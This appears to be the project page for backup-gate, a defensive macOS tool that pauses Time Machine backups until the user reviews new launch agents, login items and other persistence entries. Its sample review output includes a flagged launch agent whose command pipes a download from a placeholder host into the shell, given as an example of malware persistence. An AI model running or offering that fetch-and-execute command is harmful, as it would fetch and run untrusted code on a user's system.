backup-gate · free and open source · macOS

Keep malware out of your Time Machine backups

Time Machine backs up everything on your Mac, including malware that has installed itself. Restore that backup, or set up a new Mac from it, and the malware comes back. backup-gate checks your Mac before every backup, and holds the backup as soon as something new is set to run at startup, until you approve it.

Why I built it

In October, a fake CAPTCHA got me to paste a command into Terminal. It installed an infostealer, disguised as a launch agent named com.Apple.xkscqmbapqwbhbet. I caught it right away and rebuilt the Mac that day. My last backup was clean, but only by luck: the next hourly backup would have copied the malware in like any other file. The full story.

The problem

Malware that wants to stay on a Mac has to start again after a restart. To do that, it adds itself somewhere macOS runs things automatically: a launch agent, a login item, a line in .zshrc. Then it stays quiet.

From then on, every Time Machine backup includes it. Restore one, or move to a new Mac with Migration Assistant, and the malware is back, set up to run as before. And when the backup disk fills up, Time Machine deletes the oldest backups first: the ones from before the infection.

How backup-gate works

  1. It takes over Time Machine's automatic backups. Every 30 minutes, a small root daemon checks whether a backup is due.
  2. Before backing up, it lists everything on the Mac that can run code at startup or grant root: launch agents and daemons, login and background items, shell and SSH startup files, sudoers, cron, privileged helpers, configuration profiles, system extensions, and its own files.
  3. If that list matches what you last approved, Time Machine backs up as usual.
  4. If anything changed, the backup waits and you get a notification. You review the change: approve it if it's yours, investigate if it isn't. Until you approve, the change stays out of your backups.

Reviewing a change shows what each item is, when it was created, the command it runs and who signed that program, with warnings for the patterns malware uses:

$ sudo /usr/local/sbin/backup-gate approve
3 change(s) since the last approval (2026-11-10 13:48).

+ ADDED   Launch agent (user you): com.example.updater
           file     /Users/you/Library/LaunchAgents/com.example.updater.plist
                    created 2026-11-12 17:29, owner you:staff, mode 644
           runs     /bin/bash -c 'curl -s https://example.invalid/u | sh'
                    a tool built into macOS: judge this item by the command above
           ! starts bash: what it does depends on the arguments above
+ ADDED   Login item (you): com.clipy-app.Clipy
           runs     /Applications/Clipy.app
                    signed by Developer ID Application: Shunsuke Furubayashi (BBCHAJ584H)
- REMOVED Background daemon (runs as root): us.zoom.updater.install

Why you can trust it

backup-gate runs as root, so you shouldn't install it on trust alone. It's one bash script of about 550 lines that you can read before installing. It has no dependencies, downloads nothing and never uses the network. Each release is built by GitHub Actions from a signed tag, with a checksum and a signed build attestation you can verify. Install

You need a Mac with an admin account and a Time Machine disk connected over USB or Thunderbolt. Homebrew installs work on Apple silicon; on Intel, install from a release.

brew install mermoddity/backup-gate/backup-gate
cd "$(brew --prefix)/opt/backup-gate/libexec"
./install.sh --check      # preflight: no changes, no sudo
sudo ./install.sh         # install, then approve your Mac's current state

Read the full instructions first, including how to install from a verified release without Homebrew.

Not comfortable with Terminal? A Mac app version, with no Terminal and one-click approvals, is being considered. If you'd use it, say so here.

What it doesn't do

backup-gate keeps your backups clean; it doesn't remove malware from your Mac. It only watches the places where programs are set up to run, so malware files that aren't set up to run there are backed up like any other file, malware that runs once and leaves nothing behind doesn't trigger it, and neither does ransomware changing your documents. Malware that already has root can turn it off. Backups wait for you: if you ignore the notifications, they go stale (you're warned after 48 hours). All the limits.

FAQ

Doesn't Time Machine already protect me from malware and ransomware?

It protects your files, not the state of your Mac: it backs up whatever is there, malware included, and restores or migrates it the same way. Ransomware that encrypts your files usually can't change the backups already made, which are read-only snapshots. Malware that installs itself quietly goes into every backup from then on, and when the disk fills up, the backups from before the infection are deleted.

How is it different from BlockBlock or KnockKnock?

BlockBlock alerts you in real time when something installs persistence. KnockKnock lists what's persistent on your Mac when you run it. Neither touches your backups. backup-gate ties the backups to the same idea. They work well together.

Why not just unplug the backup disk?

Do that too: an unplugged disk is the best protection. But a disk you unplug is a disk you forget to plug in, and if malware is already on the Mac, plugging it in and backing up copies the malware too.

How often will it ask me to approve something?

After you install or update apps that add login or background items, Homebrew services or macOS, and after you edit a shell file like .zshrc. Ordinary app updates that don't touch those don't need approval.

Does it work with a network or NAS destination?

No. It reads success from the APFS snapshots on the backup disk, which requires a local disk over USB or Thunderbolt.

Is it on the Mac App Store?

No. App Store apps can't install a root LaunchDaemon or read the system's login items. It's a command-line tool.
